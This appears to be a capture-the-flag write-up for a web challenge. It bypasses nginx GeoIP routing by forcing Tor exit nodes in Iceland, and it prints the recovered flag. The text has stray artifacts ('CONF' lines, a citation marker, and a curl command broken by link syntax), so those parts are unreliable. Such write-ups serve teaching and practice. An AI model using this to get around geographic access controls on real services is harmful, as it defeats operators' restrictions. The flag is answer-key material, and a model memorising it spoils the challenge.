# North-South - picoCTF 2026 Write-Up

* **Category:** Web Exploitation
* **Difficulty:** Medium
* **Author:** Darkraicg492
* **Target URL:** `http://chatelaine.cylabacademy.net:41717/`

---

## Challenge Description
> I've set up geo-based routing - can you outsmart it?
> You're trying to retrieve the flag, but there's a catch: access to the real service is restricted based on your geographic location. Only requests from a specific region are routed to the server that holds the flag. Everyone else is sent somewhere... less interesting.

---

## Provided Resources
The challenge provided the full Nginx configuration file (`nginx.conf`):

```nginx
load_module /usr/lib/nginx/modules/ngx_http_geoip2_module.so;

worker_processes 1;
events { worker_connections 1024; }

http {
    include       mime.types;
    default_type  application/octet-stream;

    geoip2 /etc/nginx/GeoLite2-Country.mmdb {
        auto_reload 5m;
        $geoip2_data_country_code default=ZZ country iso_code;
    }

    upstream north {
        server 127.0.0.1:8000;
    }

    upstream south {
        server 127.0.0.1:9000;
    }

    server {
        listen 80;

        location / {
            if ($geoip2_data_country_code = IS) {
                proxy_pass http://south;
            }

            proxy_pass http://north;
        }
    }
}

```

Detailed Step-by-Step Solution
Step 1: Analyze the Nginx Configuration
By reviewing the provided nginx.conf, we can figure out how routing is handled:   
CONF

GeoIP Module: The server uses the ngx_http_geoip2_module with a MaxMind GeoLite2 database to inspect the incoming client's country code.   
CONF

The Condition: The server checks $geoip2_data_country_code.   
CONF

If the country code matches IS (which stands for Iceland), the request is forwarded to the backend server http://south (the server holding the flag).   
CONF

If the request comes from any other region, it falls through and gets routed to http://north (the decoy server that displays a restricted/boring message).   
CONF

Step 2: Understand Why Header Spoofing Fails
Many web challenges allow users to fake their IP using HTTP headers like X-Forwarded-For or X-Real-IP. However, because Nginx evaluates the actual underlying TCP connection socket IP against the binary MaxMind GeoIP database (GeoLite2-Country.mmdb), HTTP header spoofing will not work. Our actual source routing IP must appear to originate from Iceland.

Step 3: Configure Tor for Geolocation Bypassing
To make our traffic appear as if it is coming from Iceland, we can use the Tor network and enforce a strict Exit Node constraint.

Start the Tor service:

Bash
sudo systemctl restart tor
Edit the Tor configuration file (/etc/tor/torrc):
Open the file using a text editor:

Bash
sudo nano /etc/tor/torrc
Add Exit Node rules:
Append the following lines to force Tor to route traffic exclusively through Icelandic exit nodes:

Plaintext
ExitNodes {is}
StrictNodes 1
Restart Tor to apply changes:

Bash
sudo systemctl restart tor
Step 4: Retrieve the Flag
With Tor routing our connection through Iceland, we can issue a curl request through the local Tor SOCKS5 proxy (running on port 9050) to hit the target URL:

Bash
curl --socks5 127.0.0.1:9050 [http://chatelaine.cylabacademy.net:41717/](http://chatelaine.cylabacademy.net:41717/)
Step 5: Output & Flag
The server evaluates our connection as coming from Iceland (IS), routes us to the south upstream backend[cite: 1], and successfully returns the flag:

HTML
<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8" />
        <title>North-South</title>
        <link rel="stylesheet" type="text/css" href="/static/css/materialize.min.css" />
        <link href="[https://fonts.googleapis.com/icon?family=Material+Icons](https://fonts.googleapis.com/icon?family=Material+Icons)" rel="stylesheet">
    </head>
    <body>
        <nav>
            <div class="nav-wrapper">
                <a href="/" class="brand-logo">Home</a>
            </div>
        </nav>
        <div class="container">
            <h1>Welcome!!</h1>
            <p>academy{g30_b453d_r0u71n9_cec80706}</p>
            <hr/>
        </div>
        <script src="/static/js/materialize.min.js"></script>
    </body>
</html>
Flag
Plaintext
academy{g30_b453d_r0u71n9_cec80706}
